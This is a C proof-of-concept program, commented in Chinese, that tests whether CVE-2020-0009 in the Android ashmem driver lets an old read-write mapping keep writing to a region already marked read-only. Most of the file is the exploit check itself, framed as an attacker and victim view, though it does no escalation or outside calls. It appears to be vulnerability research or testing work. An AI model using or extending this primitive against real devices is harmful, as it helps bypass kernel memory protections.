/* SPDX-License-Identifier: GPL-3.0-or-later */

/* CVE-2020-0009 —— P1 严格验证（S4 / 3.4.5）
 *
 * P2（remap_file_pages）已实测不成立：3.4 的 mm/fremap.c 是老实现，
 * 不重走 file->f_op->mmap，且 pgoff==linear_page_index 时直接 return 0。
 *
 * 本程序只验证 P1，并给出"是否真的改到 backing shmem"的硬判据：
 *   1. 创建 ashmem，以 RW 映射（攻击者视图 p）
 *   2. ASHMEM_SET_PROT_MASK = PROT_READ（把区域声明为只读）
 *   3. 另建一个**只读**映射（受害者视图 q）—— 模拟特权进程拿到 fd 后的映射
 *   4. 通过 p 写入标记
 *   5. 读 q：若看到标记 ⇒ backing 被改，只读语义被绕过
 *
 * 同时对照：SET_PROT_MASK 之后**新建**的 PROT_WRITE 映射必须被拒（证明 prot_mask 本身有效）。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define __ASHMEMIOC		0x77
#define ASHMEM_SET_SIZE		_IOW(__ASHMEMIOC, 3, size_t)
#define ASHMEM_SET_PROT_MASK	_IOW(__ASHMEMIOC, 5, unsigned long)
#define ASHMEM_GET_PROT_MASK	_IOR(__ASHMEMIOC, 6, unsigned long)

int main(void)
{
	int fd;
	char *p, *q, *r;
	unsigned long pm;
	int fd2;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== CVE-2020-0009 P1 strict check ===\n");

	fd = open("/dev/ashmem", O_RDWR);
	if (fd < 0) { printf("[!] open: %s\n", strerror(errno)); return 1; }
	if (ioctl(fd, ASHMEM_SET_SIZE, (size_t)0x1000) < 0) {
		printf("[!] SET_SIZE: %s\n", strerror(errno)); return 1;
	}

	/* 1. 攻击者先建 RW 映射（此时 prot_mask 仍是默认全权限） */
	p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (p == MAP_FAILED) { printf("[!] RW mmap: %s\n", strerror(errno)); return 1; }
	printf("[1] attacker RW map @%p\n", p);

	/* 2. 声明为只读 */
	pm = ioctl(fd, ASHMEM_GET_PROT_MASK, 0);	/* 驱动以返回值形式给出 */
	printf("[2] prot_mask before = 0x%lx\n", pm);
	if (ioctl(fd, ASHMEM_SET_PROT_MASK, (unsigned long)PROT_READ) < 0) {
		printf("[!] SET_PROT_MASK(READ): %s\n", strerror(errno)); return 1;
	}
	pm = ioctl(fd, ASHMEM_GET_PROT_MASK, 0);
	printf("[2] prot_mask after  = 0x%lx (PROT_READ=%d)\n", pm, PROT_READ);

	/* 3. 受害者视图：只读映射 */
	q = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
	if (q == MAP_FAILED) {
		printf("[!] RO mmap (victim): %s\n", strerror(errno));
	} else {
		printf("[3] victim RO map @%p, initial byte=%02x\n",
		       q, (unsigned char)q[0]);
	}

	/* 3b. 对照：试图新建 PROT_WRITE 映射，应当被拒 */
	r = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (r == MAP_FAILED)
		printf("[3b] new RW mmap refused: %s  (prot_mask 生效)\n",
		       strerror(errno));
	else
		printf("[3b] new RW mmap SUCCEEDED @%p  (prot_mask 无效?!)\n", r);

	/* 4. 通过老映射写入 */
	p[0] = 0x5A;
	__sync_synchronize();
	printf("[4] attacker wrote 0x5a via old RW map\n");

	/* 5. 受害者视图检查 */
	if (q != MAP_FAILED) {
		printf("[5] victim sees %02x -> %s\n", (unsigned char)q[0],
		       (unsigned char)q[0] == 0x5A
		       ? "*** READONLY SEMANTICS BYPASSED ***"
		       : "isolated");
	}

	/* 6. 另一 fd 以只读打开同一区域（模拟跨进程） */
	fd2 = open("/dev/ashmem", O_RDWR);
	if (fd2 >= 0) {
		/* 这里无法用同名复用到同一 region，仅作占位说明 */
		close(fd2);
	}

	printf("=== done ===\n");
	return 0;
}
